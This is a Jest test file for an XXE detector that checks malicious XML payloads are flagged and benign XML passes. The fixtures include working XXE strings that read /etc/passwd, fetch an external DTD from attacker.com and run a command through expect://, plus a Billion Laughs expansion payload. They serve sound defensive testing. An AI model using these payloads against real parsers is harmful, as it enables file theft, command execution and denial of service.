'use strict';

const { evaluatePayloads } = require('../src/index');

describe('XXE Detector', () => {
  it('detects system and public entity declarations', () => {
    const results = evaluatePayloads([
      { payload: '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [  <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>', expected: 'malicious' },
      { payload: '<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>', expected: 'malicious' },
      { payload: '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "expect://id"> %xxe;]>', expected: 'malicious' },
      { payload: '<!DOCTYPE root [<!ENTITY % dtd PUBLIC "-//W3C//TEXT entity//EN" "http://attacker.com/evil.dtd">]>', expected: 'malicious' }
    ]);
    expect(results.summary.truePositives).toBe(4);
  });

  it('detects entity expansion (Billion Laughs)', () => {
    const results = evaluatePayloads([
      { payload: '<?xml version="1.0"?><!DOCTYPE lolz [ <!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> ]><lolz>&lol2;</lolz>', expected: 'malicious' }
    ]);
    expect(results.summary.truePositives).toBe(1);
  });

  it('allows benign XML payloads', () => {
    const results = evaluatePayloads([
      { payload: '<?xml version="1.0"?><catalog><book id="bk101"><author>Gambardella, Matthew</author><title>XML Developer\'s Guide</title></book></catalog>', expected: 'benign' },
      { payload: '<root><message>Hello World</message></root>', expected: 'benign' }
    ]);
    expect(results.summary.trueNegatives).toBe(2);
  });
});
